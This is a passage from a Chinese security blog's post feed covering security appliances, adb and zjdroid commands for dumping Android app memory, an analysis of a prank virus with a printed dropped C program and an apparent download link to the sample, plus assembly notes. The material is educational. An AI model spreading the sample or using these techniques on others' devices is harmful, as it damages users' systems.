功能，直接向 NTA SE2000 发送 Netflow 数据。</p><h2 id="web应用漏洞扫描系统wvss"><a class="markdownIt-Anchor" href="#web应用漏洞扫描系统wvss"></a> <mark>WEB应用漏洞扫描系统WVSS</mark></h2><ul><li>工作原理</li></ul><p>采用扫描引擎对web应用进行扫描对应数据库中的<mark>漏洞特征</mark>，参照对应漏洞利用<mark>规律</mark>，对漏洞进行<mark>试错</mark>，发动<mark>攻击</mark></p><ul><li><p>部署方式</p><p>对目标站点“网络可达”即可</p></li><li><p>典型部署方式</p></li></ul><p>独立部署（WVSS直接对目标）、分布式部署（即一个WVSS通过交换机管理多个WVSS（对目标进行扫描的））、与WAF联动部署（即与WAF并联部署）、虚拟化部署（即在virtualization Layer之上部署）</p><h2 id="安全网关"><a class="markdownIt-Anchor" href="#安全网关"></a> 安全网关</h2><p>安全网关是指设置在不同网络或网络安全域之间的一系列部件的组合的统称。</p><ul><li>工作原理</li></ul><p>它可通过监测、限制、更改跨越安全网关的数据流，尽可能地对外部屏蔽网络内部的信息、结构和运行状况，并通过检测阻断威胁，以及网络数据加密等手段来实现网络和信息的安全。</p><ul><li>接口模式</li></ul><p>安全网关接入<mark>物理层、数据链路层、网络层、传输层</mark></p><ul><li><p>部署方式</p></li><li><p>典型部署位置</p></li></ul><p>网络出口处</p><h2 id="内容安全管理系统scm"><a class="markdownIt-Anchor" href="#内容安全管理系统scm"></a> 内容安全管理系统(SCM)</h2><ul><li>工作原理</li></ul><p>工作在网络层对数据包进行识别，对网络通信内容、网络行为和流量进行分析、过滤和控制</p><ul><li>接口模式</li></ul><p>接入网络层</p><ul><li>部署方式</li></ul><p>透明模式、路由模式、旁路监听模式部署</p><ul><li>典型部署位置</li></ul><h2 id="数据库审计系统das"><a class="markdownIt-Anchor" href="#数据库审计系统das"></a> 数据库审计系统（DAS）</h2><ul><li>工作原理</li></ul><p>完全模拟数据库的词法、语法(lex/yacc)解析，漏洞特征识别技术，细粒度访问审计配置，监控数据库访问，完整的数据备份和还原，</p><ul><li><p>接口模式</p></li><li><p>部署方式</p></li></ul><ol><li>旁路模式部署</li><li>多级部署模式-“探针”记录和分析数据库的操作以及数据库的响应，审计中心汇总所有”探针点“捕获的信息</li></ol><ul><li>典型部署位置</li></ul><p>交换外接、直接或间连接数据库</p><h2 id="入侵防护系统ips"><a class="markdownIt-Anchor" href="#入侵防护系统ips"></a> <mark>入侵防护系统IPS</mark></h2><ul><li>工作原理</li></ul><p>针对于HTTP等基础协议的应用层攻击问题，WEB2.0安全问题、木马、后门、间谍软件、僵尸网络、DDOS攻击、网络资源滥用这些问题，IPS有规则特征库，并且具备持续更新的信誉特征库对有效已知安全问题威胁和未知软件造成的危害，同时内网安全ID能有效防止内网持续渗透，有效降低敏感数据泄露和服务异常</p><ul><li>接口模式</li></ul><p>M口、H1口、G口、T口（m口模拟启用、其他口插入网线启用拔插网线关闭，也可以手动开关）</p><p>类型：电口、万兆口、千兆口</p><p>#标准 snmp trap（V1、 V2、 V3）和 syslog 接口</p><ul><li>部署方式</li></ul><p>在线部署（开箱即用）零配置</p><ul><li>典型部署位置</li></ul><p>IPS一般采用直通部署方式部署在实际网络中M管理口，G<sub>1</sub>/<sub>1</sub>  、G<sub>1</sub>/<sub>2</sub> 为直通接口</p><h2 id="网络入侵防护系统nips"><a class="markdownIt-Anchor" href="#网络入侵防护系统nips"></a> 网络入侵防护系统(NIPS)</h2><ul><li>工作原理</li></ul><p>深度入侵防护和检测、高级威胁防护、精细流量控制（僵尸网络、流量控制、应用管理）、身份识别与控制、应用层安全控制、基于用户的行为分析</p><ul><li><p>接口模式</p></li><li><p>部署方式</p></li></ul><p>A/A和A/S两种部署方式</p><ul><li>典型部署位置</li></ul><p>网络重要位置（指交换机、网络出入口、网络聚合口等）</p><h2 id="远程安全评估系统rsas"><a class="markdownIt-Anchor" href="#远程安全评估系统rsas"></a> <mark>远程安全评估系统（RSAS）</mark></h2><ul><li>工作原理</li></ul><p>检测网络中各类脆弱性风险，提供专业有效的安全分析和修补建议，对修改补效果进行审计减小受攻击面</p><ul><li>接口模式</li></ul><p>用户通过浏览器访问 Web 页面、通过串口访问控制台、通过数据接口进行数据交互等方式，其中数据接口包含第三方平台管理数据接口、 SNMP Trap</p><ul><li>部署方式</li></ul><p>单机单网络、单机多网络、分布式部署、扫描代理、虚拟环境直接部署等</p><ul><li>典型部署位置</li></ul><p>外网、内网均可</p><ul><li>注意事项</li></ul><ol><li>经客户允许</li><li>在网页上关，其次在关电源</li><li>UTF-8</li><li>清除扫描前后数据</li><li>web登陆前，证书查看是否过期</li><li>口令操作要取消</li><li>只用一个扫描口进行扫描</li></ol>]]></content>
      
      
      <categories>
          
          <category> 等级保护 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 安全设备 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>安卓逆向常用命令</title>
      <link href="/2020/11/19/%E5%AE%89%E5%8D%93%E9%80%86%E5%90%91%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/"/>
      <url>/2020/11/19/%E5%AE%89%E5%8D%93%E9%80%86%E5%90%91%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="常见命令"><a class="markdownIt-Anchor" href="#常见命令"></a> 常见命令</h1><figure class="highlight plain"><table><tr><td class="code"><pre><code class="hljs plain">adb devices<br><br>adb  install xx.apk<br><br>adb pull &#x2F;system&#x2F;bin&#x2F;linker<br><br>adb push android_server &#x2F;DIR<br><br>adb shell chmod 777 &#x2F;DIR<br><br>adb shell .&#x2F;DIR&#x2F;file<br><br>adb pull &#x2F;system&#x2F;lib&#x2F;libdvm.so(取得libdvm.so,找一下dvmDexOpenPartial)<br><br>adb forward tcp:23946 tcp23946 (端口转发，调试手机上的某个进程要有协议支持通信)<br><br>adb shell am start -D -n com.example.adbihook&#x2F;.MainActivity<br>(说明：以启动模式启动，是停在加载so文件之前，包名在AndroidMainfest文件中可以找到)<br><br>在ida options设置，adb forward tcp:8700 jdwp:2560(PID)（jdwp是后面jdb调试器的协议，转换后到待调试的指定应用程序）<br><br>jdb -connect com.sun.jdi.SocketAttach:hostname&#x3D;localhost.port&#x3D;8700(使用jdb进行附加)<br><br>（Android:debuggable&#x3D;&quot;true&quot;)<br><br>adb shell dumpsys activity top  获取当前程序的activity信息（实用）牢记pid用pid查看这个应用在手机里面dex所在位置<br><br>获得apk当前加载dex文件信息(zjdroid)<br>adb shell am broadcast -a com.zjdroid.invoke --ei target [pid] --es cmd &#39;&#123;&quot;action&quot;:&quot;dump_dexinfo&quot;&#125;&#39;<br>获取指定dex文件包含可加载类名<br>adb shell am broadcast -a com.zjdroid.invoke --ei target [pid] --es cmd &#39;&#123;&quot;action&quot;:&quot;dump_class&quot;,&quot;dexpath&quot;:&quot;*****&quot;&#125;&#39;<br>根据dalvik相关指针动态反编译指定dex，并以文件形式保存<br>adb shell am broadcast -a com.zjdroid.invoke --ei target [pid] --es cmd &#39;&#123;&quot;action&quot;:&quot;backsmali&quot;,&quot;dexpath&quot;:&quot;*****&quot;&#125;&#39;<br>DUMP指定dex内存中数据并保存到文件（数据为odex格式，可以在pc上反编译）<br>adb shell am broadcast -a com.zjdroid.invoke --ei target [pid] --es cmd &#39;&#123;&quot;action&quot;:&quot;dump_dexfile&quot;,&quot;dexpath&quot;:&quot;*****&quot;&#125;&#39;<br>dump指定内存空间区域数据到文件<br>adb shell am broadcast -a com.zjdroid.invoke --ei target [pid] --es cmd &#39;&#123;&quot;action&quot;:&quot;dump_mem&quot;,&quot;start&quot;:12345678,&quot;length&quot;:123&#125;&#39;<br>dump dalvik 堆栈信息到文件，文件可以通过Java heap分析工具分析处理<br>adb shell am broadcast -a com.zjdroid.invoke --ei target [pid] --es cmd &#39;&#123;&quot;action&quot;:&quot;dump_heap&quot;&#125;&#39;<br>运行时动态调用LUA脚本<br>该功能可以通过lua脚本动态调用Java代码。使用场景：可以动态调用解密函数，完成解密。可以动态触发特定逻辑。<br>adb shell am broadcast -a com.zjdroid.invoke --ei target [pid] --es cmd &#39;&#123;&quot;action&quot;:&quot;invoke&quot;,&quot;filepath&quot;:&quot;*****&quot;&#125;&#39;<br><br>adb shell logcat -s zjdroid-shell -&#123;package name&#125;    命令执行结果输出<br>adb shell logcat -s zjdroid-apimonitor -&#123;package name&#125; 查看敏感api调用<br></code></pre></td></tr></table></figure><ul><li>1、添加smalidea插件</li><li>2、 Apktool A tool for reverse engineering Android apk files</li><li>3、导入Android Studio , import Project</li><li>4、配置AS调试配置，Run-&gt;Edit Configurations,点击+号，新建remote类型调试器，如果默认端口被占用则需要修改端口号。</li><li>5、adb shell am start -D -n xxx/xxx(以调试模式启动应用，进程挂起)</li><li>6.adb forward tcp:5005 jdwp:pid</li><li>7、开始调试</li></ul>]]></content>
      
      
      <categories>
          
          <category> 安卓 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 调试 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>卢本伟病毒样本分析</title>
      <link href="/2020/09/11/%E5%8D%A2%E6%9C%AC%E4%BC%9F%E7%97%85%E6%AF%92%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/"/>
      <url>/2020/09/11/%E5%8D%A2%E6%9C%AC%E4%BC%9F%E7%97%85%E6%AF%92%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>样本信息</p><p>​                               <img src= "/img/loading.gif" data-src="https://pdc246871-1302651496.cos.ap-nanjing.myqcloud.com/20200911221403.png" alt="" /></p><h1 id="静态分析"><a class="markdownIt-Anchor" href="#静态分析"></a> 静态分析</h1><h2 id="查壳"><a class="markdownIt-Anchor" href="#查壳"></a> 查壳</h2><p><img src= "/img/loading.gif" data-src="https://pdc246871-1302651496.cos.ap-nanjing.myqcloud.com/20200911221444.png" alt="" /></p><p><img src= "/img/loading.gif" data-src="https://pdc246871-1302651496.cos.ap-nanjing.myqcloud.com/20200911221501.png" alt="" /></p><h2 id="查看调用了什么算法"><a class="markdownIt-Anchor" href="#查看调用了什么算法"></a> 查看调用了什么算法</h2><p><img src= "/img/loading.gif" data-src="https://pdc246871-1302651496.cos.ap-nanjing.myqcloud.com/20200911221614.png" alt="" /></p><h2 id="用ida打开"><a class="markdownIt-Anchor" href="#用ida打开"></a> 用IDA打开</h2><p>可以发现代码逻辑清晰，推测没有加壳</p><p>​     <img src= "/img/loading.gif" data-src="https://pdc246871-1302651496.cos.ap-nanjing.myqcloud.com/20200911221643.png" alt="" /></p><p><img src= "/img/loading.gif" data-src="https://pdc246871-1302651496.cos.ap-nanjing.myqcloud.com/20200911221659.png" alt="" /></p><p><img src= "/img/loading.gif" data-src="https://pdc246871-1302651496.cos.ap-nanjing.myqcloud.com/20200911221725.png" alt="" /></p><h2 id="查看导入表"><a class="markdownIt-Anchor" href="#查看导入表"></a> 查看导入表</h2><p><img src= "/img/loading.gif" data-src="https://pdc246871-1302651496.cos.ap-nanjing.myqcloud.com/20200911221815.png" alt="" /></p><p>可以在清晰的知道病毒使用ADVAPI32对注册表进行一系列操作</p><p><img src= "/img/loading.gif" data-src="https://pdc246871-1302651496.cos.ap-nanjing.myqcloud.com/image-20200911221840987.png" alt="image-20200911221840987" /></p><h1 id="动态分析"><a class="markdownIt-Anchor" href="#动态分析"></a> <strong>动态分析</strong></h1><h2 id="沙箱运行"><a class="markdownIt-Anchor" href="#沙箱运行"></a> 沙箱运行</h2><p><strong>主要特征：设置桌面背景，删除系统文件，命令执行（包括不限于关闭安全服务，注册表操作，修改图标），鼠标设置为错误图标。</strong></p><p>​     <img src= "/img/loading.gif" data-src="https://pdc246871-1302651496.cos.ap-nanjing.myqcloud.com/20200911221852.png" alt="" /></p><p><img src= "/img/loading.gif" data-src="https://pdc246871-1302651496.cos.ap-nanjing.myqcloud.com/20200911221916.png" alt="" /></p><p><img src= "/img/loading.gif" data-src="https://pdc246871-1302651496.cos.ap-nanjing.myqcloud.com/20200911221937.png" alt="" /></p><p>​     <img src= "/img/loading.gif" data-src="https://pdc246871-1302651496.cos.ap-nanjing.myqcloud.com/20200911221956.png" alt="" /><img src= "/img/loading.gif" data-src="https://pdc246871-1302651496.cos.ap-nanjing.myqcloud.com/20200911222011.png" alt="" /></p><p><img src= "/img/loading.gif" data-src="https://pdc246871-1302651496.cos.ap-nanjing.myqcloud.com/image-20200911222119079.png" alt="image-20200911222119079" /></p><h1 id="病毒分析"><a class="markdownIt-Anchor" href="#病毒分析"></a> 病毒分析</h1><h2 id="start处分析"><a class="markdownIt-Anchor" href="#start处分析"></a> start处分析</h2><p><img src= "/img/loading.gif" data-src="https://pdc246871-1302651496.cos.ap-nanjing.myqcloud.com/image-20200912190539545.png" alt="image-20200912190539545" /><img src= "/img/loading.gif" data-src="https://pdc246871-1302651496.cos.ap-nanjing.myqcloud.com/image-20200911222202610.png" alt="image-20200911222202610" /></p><p>在start函数中可以看到，获得系统当前用户所在路径和操作系统信息、取得模块句柄启动主线程。</p><h2 id="写出文件"><a class="markdownIt-Anchor" href="#写出文件"></a> 写出文件</h2><p><img src= "/img/loading.gif" data-src="https://pdc246871-1302651496.cos.ap-nanjing.myqcloud.com/image-20200911222207971.png" alt="image-20200911222207971" /></p><p><img src= "/img/loading.gif" data-src="https://pdc246871-1302651496.cos.ap-nanjing.myqcloud.com/image-20200911222213083.png" alt="image-20200911222213083" /></p><p>write_0函数：</p><p><img src= "/img/loading.gif" data-src="https://pdc246871-1302651496.cos.ap-nanjing.myqcloud.com/image-20200912192122462.png" alt="image-20200912192122462" /></p><h2 id="命令行执行"><a class="markdownIt-Anchor" href="#命令行执行"></a> 命令行执行</h2><p><img src= "/img/loading.gif" data-src="https://pdc246871-1302651496.cos.ap-nanjing.myqcloud.com/image-20200911222220657.png" alt="image-20200911222220657" /></p><p><img src= "/img/loading.gif" data-src="https://pdc246871-1302651496.cos.ap-nanjing.myqcloud.com/image-20200911222225908.png" alt="image-20200911222225908" /><img src= "/img/loading.gif" data-src="https://pdc246871-1302651496.cos.ap-nanjing.myqcloud.com/image-20200911222235625.png" alt="image-20200911222235625" /></p><p><img src= "/img/loading.gif" data-src="https://pdc246871-1302651496.cos.ap-nanjing.myqcloud.com/image-20200911222252361.png" alt="image-20200911222252361" /></p><p>​             <img src= "/img/loading.gif" data-src="https://pdc246871-1302651496.cos.ap-nanjing.myqcloud.com/image-20200911222304636.png" alt="image-20200911222304636" /><img src= "/img/loading.gif" data-src="https://pdc246871-1302651496.cos.ap-nanjing.myqcloud.com/image-20200911222314449.png" alt="image-20200911222314449" /></p><p><img src= "/img/loading.gif" data-src="https://pdc246871-1302651496.cos.ap-nanjing.myqcloud.com/image-20200911222321749.png" alt="image-20200911222321749" /><img src= "/img/loading.gif" data-src="https://pdc246871-1302651496.cos.ap-nanjing.myqcloud.com/image-20200911222334170.png" alt="image-20200911222334170" /><img src= "/img/loading.gif" data-src="https://pdc246871-1302651496.cos.ap-nanjing.myqcloud.com/image-20200911222339453.png" alt="image-20200911222339453" /><img src= "/img/loading.gif" data-src="https://pdc246871-1302651496.cos.ap-nanjing.myqcloud.com/image-20200911222329184.png" alt="image-20200911222329184" /></p><p><img src= "/img/loading.gif" data-src="https://pdc246871-1302651496.cos.ap-nanjing.myqcloud.com/image-20200911222349068.png" alt="image-20200911222349068" /></p><p>以上是命令行执行函数和参数</p><h2 id="启动打印机"><a class="markdownIt-Anchor" href="#启动打印机"></a> 启动打印机</h2><p><img src= "/img/loading.gif" data-src="https://pdc246871-1302651496.cos.ap-nanjing.myqcloud.com/image-20200911222452347.png" alt="image-20200911222452347" /></p><p><img src= "/img/loading.gif" data-src="https://pdc246871-1302651496.cos.ap-nanjing.myqcloud.com/image-20200911222502323.png" alt="image-20200911222502323" /></p><p><img src= "/img/loading.gif" data-src="https://pdc246871-1302651496.cos.ap-nanjing.myqcloud.com/image-20200911222513290.png" alt="image-20200911222513290" /></p><p>对于打印机，会向打印机发送一些字符串，并打印出来</p><h2 id="屏蔽快捷键修改图标"><a class="markdownIt-Anchor" href="#屏蔽快捷键修改图标"></a> 屏蔽快捷键&amp;修改图标</h2><p><img src= "/img/loading.gif" data-src="https://pdc246871-1302651496.cos.ap-nanjing.myqcloud.com/image-20200912193606362.png" alt="" />   <img src= "/img/loading.gif" data-src="https://pdc246871-1302651496.cos.ap-nanjing.myqcloud.com/image-20200911222519726.png" alt="image-20200911222519726" /></p><p><img src= "/img/loading.gif" data-src="https://pdc246871-1302651496.cos.ap-nanjing.myqcloud.com/image-20200912193730777.png" alt="image-20200912193730777" /></p><p>获得快捷键数组，屏蔽快捷键；修改图标</p><h2 id="恶意软件生成内容"><a class="markdownIt-Anchor" href="#恶意软件生成内容"></a> 恶意软件生成内容</h2><p>Main.cpp内容（从程序导出）</p><figure class="highlight c"><table><tr><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;tchar.h&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;windows.h&gt;</span></span><br><br> <br><br><span class="hljs-function"><span class="hljs-keyword">int</span> WINAPI <span class="hljs-title">WinMain</span> <span class="hljs-params">(HINSTANCE hThisInstance,HINSTANCE hPrevInstance,LPSTR lpszArgument,<span class="hljs-keyword">int</span> nCmdShow)</span></span><br><span class="hljs-function"></span><br><span class="hljs-function"></span>&#123;<br><br>  HWND hwnd = GetDesktopWindow();<br><br>  HDC hdc = GetWindowDC(hwnd);<br><br>  POINT <span class="hljs-built_in">point</span>;<br><br>  <span class="hljs-keyword">while</span>(<span class="hljs-number">1</span>)<br><br>  &#123;<br><br>​    GetCursorPos(&amp;<span class="hljs-built_in">point</span>);<br><br>​    DrawIcon(hdc,<span class="hljs-built_in">point</span>.x,<span class="hljs-built_in">point</span>.y,LoadIcon(<span class="hljs-literal">NULL</span>, IDI_ERROR));<br><br>​    Sleep(<span class="hljs-number">10</span>);<br><br>  &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><p>Ghost.exe:</p><p><img src= "/img/loading.gif" data-src="https://pdc246871-1302651496.cos.ap-nanjing.myqcloud.com/image-20200911222538808.png" alt="image-20200911222538808" /></p><p>Drawerror.exe:顾名思义就是在鼠标经过的地方出现error图标（由main.cpp编译而来)</p><p><img src= "/img/loading.gif" data-src="https://pdc246871-1302651496.cos.ap-nanjing.myqcloud.com/image-20200911222544733.png" alt="image-20200911222544733" /></p><h1 id="总结"><a class="markdownIt-Anchor" href="#总结"></a> 总结</h1><p>新手分析病毒，如有错误欢迎指出。</p><p><a href="https://pan.baidu.com/s/1S45g40UXdKGiGapOduiv8w" target="_blank" rel="noopener">https://pan.baidu.com/s/1S45g40UXdKGiGapOduiv8w</a><br />提取码：52po</p>]]></content>
      
      
      <categories>
          
          <category> binary analysis </category>
          
      </categories>
      
      
        <tags>
            
            <tag> virus analysis </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SMC介绍</title>
      <link href="/2020/09/11/SMC%E4%BB%8B%E7%BB%8D/"/>
      <url>/2020/09/11/SMC%E4%BB%8B%E7%BB%8D/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="smc"><a class="markdownIt-Anchor" href="#smc"></a> SMC</h1><h2 id="什么是smc"><a class="markdownIt-Anchor" href="#什么是smc"></a> 什么是SMC</h2><p>即self-Modifying Code，指出现的时机可以分为两种：</p><p>1仅在初始化时修改（各种压缩壳）</p><p>2贯穿控制流的修改（各种动态解密代码、shellcode等）</p><h2 id="作用"><a class="markdownIt-Anchor" href="#作用"></a> 作用</h2><p>灵活，代码可以动态生成，各种代码动态机制都离不开SMC</p><p>隐蔽，运行时修改代码，能有效增加静态逆向工程难度</p>]]></content>
      
      
      <categories>
          
          <category> binary analysis </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> basic </tag>
            
            <tag> programme analysis </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>计算机基础</title>
      <link href="/2020/07/27/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80/"/>
      <url>/2020/07/27/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="80368模式"><a class="markdownIt-Anchor" href="#80368模式"></a> 80368模式</h1><h2 id="寻址方式"><a class="markdownIt-Anchor" href="#寻址方式"></a> 寻址方式</h2><p>有实模式和保护模式，即和64位的寻址方式比较相似，可以类比。</p><p>实模式是与8086就是几乎一模一样的，所以不再介绍。</p><p><img src= "/img/loading.gif" data-src="https://pdc246871-1302651496.cos.ap-nanjing.myqcloud.com/image-20200412175657373.png" alt="" /></p><p>全局描述符表寄存器GDTR ( Global Descriptor Table Register ) , 是48位寄存器，用来保存全局描述符表( GDT )的32位基地址和GDT的大小( 16位)。◆中断描述符表寄存器IDTR ( Interrupt Descriptor Table Register) , 是48位寄存器,用来保存中断描述符表( IDT )的32位基地址和IDT的大小(16位)。局部描述符表寄存器LDTR ( Local Descriptor Table Register ) , 是16位寄存器,保存局部描述符表LDT段的选择符。任务状态寄存器TR ( Task State Register )是16位寄存器，用于保存任务状态段TSS段的16位选择符。</p><p><img src= "/img/loading.gif" data-src="https://pdc246871-1302651496.cos.ap-nanjing.myqcloud.com/image-20200412175821437.png" alt="image-20200412175821437" /></p><p>保护模式是根据cs区分，16位二进制区分；通过ti值区分是否通过局部描述符表寄存器LDTR两个分别指向全局描述符表GDT和局部描述符表LDT；通过段寄存器来提供索引从段选择表中选择接收到的索引来找到相应的段描述符。</p><p><img src= "/img/loading.gif" data-src="https://pdc246871-1302651496.cos.ap-nanjing.myqcloud.com/image-20200412203452617.png" alt="image-20200412203452617" /></p><p>标志寄存器的第17位为vm表示是不是保护模式</p><p><img src= "/img/loading.gif" data-src="https://pdc246871-1302651496.cos.ap-nanjing.myqcloud.com/image-20200412203819032.png" alt="image-20200412203819032" /></p><h2 id="传送指令"><a class="markdownIt-Anchor" href="#传送指令"></a> 传送指令</h2><p>movsx dst,src 有符号</p><p>movzx dst,src 无符号</p><p>bswap reg 将32位寄存器中，第一个字节和第4个字节交换，第二个字节和第三个字节交换</p><p>pusha 将16位通用寄存器压入堆栈，压栈顺序：AX,CX,DX,BX,SP,BP,SI,DI</p><p>PUSHAD 将32位通用寄存器压入堆栈，压栈顺序EAX,ECX,EDX,EBX,ESP,EBP,ESI,EDI</p><p>POPA 和popad 分别移出16字节、32字节并按相反压栈顺序存入寄存器</p><p>lahf将标志寄存器中低8位送入ah，sahf将ah中内容送标志寄存器中低8位</p><p>PUSHF将标志寄存器低16位内容压入堆栈, SP←SP-2。 POPF将当前栈顶一个字传送到标志寄存器低16位中, SP←-SP+2.</p><p>PUSHFD将标志寄存器32位内容压入堆栈SP←SP-4。POPFD将当前栈顶一个双字传送到32位标志寄存器中，SP←SP+4。</p><p>mov、pop、push系列都不影响标志位</p><h2 id="算术运算指令"><a class="markdownIt-Anchor" href="#算术运算指令"></a> 算术运算指令</h2><p>功能: ADD是将源操作数与目的操作数相加,结果传送到目的操作数。ADC是将源操作数与目的操作数以及CF(低位进位)值相加,结果传送到目的操作数。</p><p>源操作数可以是通用寄存器、存储器或立即数。目的操作数可以是通用寄存器或存储器操作数。</p><p>ADD , ADC指令影响标志位为OF , SF , ZF , AF, PF , CF.</p><p>MOV AX,9876H</p><p>ADD AH, AL; AX=0E76H CF=1 SF=0OF=0 ZF=0 AF=0 PF=0</p><p>ADC AH , AL ; AX=8576H CF=0 SF=1OF=1 ZF=0 AF=1 PF=0</p><p>功能: SUB将目的操作数减源操作数,结果送目的操作数。SBB将 目的操作数减源操作数,还要减CF(低位借位)值,结果送目的操作数。</p><p>源操作数可以是通用寄存器、存储器或立即数。目的操作数可以是通用寄存器或存储器操作数。</p><p>SUB , SBB指令影响标志位为OF , SF , ZF, AF, PF , CF。</p><p>MOV AX，9966H ; AX=9966H</p><p>SUB AL, 80H;AL=E6H CF=1SF=1 OF=1 ZF=0 AF=0 PF=0</p><p>SBB AH, 80H;AH=18H CF=0SF=0 OF=0 ZF=0 AF=0 PF=1</p><p>inc dst 加一 dec dst 减一</p><p>INC指令将目的操作数加1 , 结果送目的操作数。DEC指令将目的操作数减1 , 结果送目的操作数。目的操作数为通用寄存器或存储器操作数。INC , DEC指令影响标志位为OF , SF , ZF, AF , PF.</p><p>功能:目的操作数减源操作数,结果不回送。源操作数为通用寄存器、存储器和立即数。目的操作数为通用寄存器、存储器操作数。CMP指令影响标志位为OF , SF , ZF , AF, PF , CF。</p><p><img src= "/img/loading.gif" data-src="https://pdc246871-1302651496.cos.ap-nanjing.myqcloud.com/image-20200412214841009.png" alt="image-20200412214841009" /></p><p>格式: XADD DEST , REG</p><p>功能:目的操作数加源操作数,结果送目的操作数。原目的操作数内容送源操作数。源操作数允许为通用寄存器。目的操作数允许为通用寄存器、存储器操作数。</p><p>格式: XADD DEST , REG<br />功能:目的操作数加源操作数,结果送目的操作数。原目的操作数内容送源操作数。源操作数允许为通用寄存器。目的操作数允许为通用寄存器、<br />存储器操作数。<br />XADD指令影响标志位为OF , SF , ZF , AF, PF , CF.</p><p>NEG DEST</p><p>功能:对目的操作数求补,用零减去目的操作数,结果送目的操作数。目的操作数为通用寄存器、存储器操作数。</p><p>NEG指令影响标志位为OF,SF,ZF,AF,PF,CF。</p><p>功能: MUL为无符号数乘法指令, IMUL为带符号数乘法指令。源操作数为通用寄存器或存储器操作数。目的操作数缺省存放在ACC(AL, AX, EAX)中,乘积存AX, DX: AX, EDX : EAX中。</p><p>字节乘: AL SRC-→AX</p><p>字乘: AX SRC-→DX : AX</p><p>双字乘: EAX SRC-→EDX: EAX</p><p>MUL , IMUL指令执行后, CF=OF=0 ,表示乘积高位无有效数据; CF=OF= 1表示乘积高位含有效数据,对其它标志位无定义。</p><p>功能: DIV为无符号数除法, IDIV为带符号数除法。源操作数作为除数,为通用寄存器或存储器操作数。被除数缺省在目的操作数AX ,DX: AX, EDX: EAX中。</p><p>字节除法: AX/SRC商→AL,余数-→AH</p><p>字除法: DX-AX/SRC商-→AX ,余数→DX_</p><p>双字除法: EDX:EAX/SRC商-→EAX ,余数-→EDX</p><p>由于被除数必须是除数的双倍字长，-般应使用扩展指令进行高位扩展。当进行无符号数除法时,被除数高位按0扩展为双倍除数字长。当进行有符号数除法时,被除数以补码表示。可使用扩展指令CBW , CWD , CWDE , CDQ进行高位打展。</p><p>对于带符号除法,其商和余数均采用补码形式表示,余数与被除数同符号。当除数为零或商超过了规定数据类型所能表示的范围时, 将会出现溢出现象,产生一个中断类型码为&quot;0&quot; 的中断。执行除法指令后标志位无定义。</p><h2 id="逻辑运算控制转移指令"><a class="markdownIt-Anchor" href="#逻辑运算控制转移指令"></a> 逻辑运算&amp;控制转移指令</h2><p>and dst,src</p><p>功能:目的操作数和源操作数按位进行逻辑与运算,结果存目的操作数中。源操作数可以是通用寄存器、存储器或立即数。目的操作数可以是通用寄存器或存储器操作数。</p><p>or dst,src 位为1结果置1，都为0才置零</p><p>xor dst,src 异或，即不相同为1</p><p>not dst,src取反</p><p>test dst,src</p><p>功能:目的操作数和源操作数按位进行逻辑与操作,结果不回送目的操作数。源操作数可以为通用寄存器、存储器或立即数。目的操作数可以为通功能:目的操作数和源操作数按位进行逻辑与操作,结果不回送目的操作数。源操作数可以为通用寄存器、存储器或立即数。目的操作数可以为通用寄存器或存储器操作数。</p><p>TEST指令常用于测试操作数中某位是否为1 r而且不会影响目的操作数。如果测试某位的状态,对某位进行逻辑与1的运算,其它位逻辑与0 ,然后判断标志位。运算结果为0 , ZF=1 ,表示被测试位为0 ;否则ZF=0 ,表示被测试位为1.</p><p>算术/逻辑左移指令<br />格式: SAL DEST , OPRD<br />SHL DEST , OPRD<br />功能:按照操作数OPRD规定的移位位数,对目的操作数进行左移操作,最高位移入CF中。每移动- -位,右边补一位0。目的操作数可以<br />用寄存器或存储器操作数。<br />SAL , SHL指令影响标志位OF, SF , ZF, PF, CF。</p><h2 id="串操作处理器控制指令"><a class="markdownIt-Anchor" href="#串操作处理器控制指令"></a> 串操作&amp;处理器控制指令</h2><p>串操作通常以DS : (E)SI来寻址源串,以ES : (E)DI来寻址目的串,对于源串允许段超越。(E)SI或(E)Dl这两个地址指针在每次串操作后,都自动进行修改,以指向串中下一个串元素。地址指针修改是增量还是减量由方向标志来规定。当DF=0 , (E)SI及(E)DI的修改为增量;当DF= 1 , (E)SI及(E)DI的修改为减量。根据串元素类型不同,地址指针增减量也不同,在串操作时,字节类型SI , DI咖、减1 ;字类型SI , DI加、减2;双字类型ESI ,EDI加、减4。如果需要连续进行串操作,通常加重复前缀。重复前缀可以和任何串操作指令组合,形成复合指令</p><p><img src= "/img/loading.gif" data-src="https://pdc246871-1302651496.cos.ap-nanjing.myqcloud.com/image-20200413204522332.png" alt="image-20200413204522332" /></p><p>movs ，movsw,movsb,movsd 串传送指令</p><p><img src= 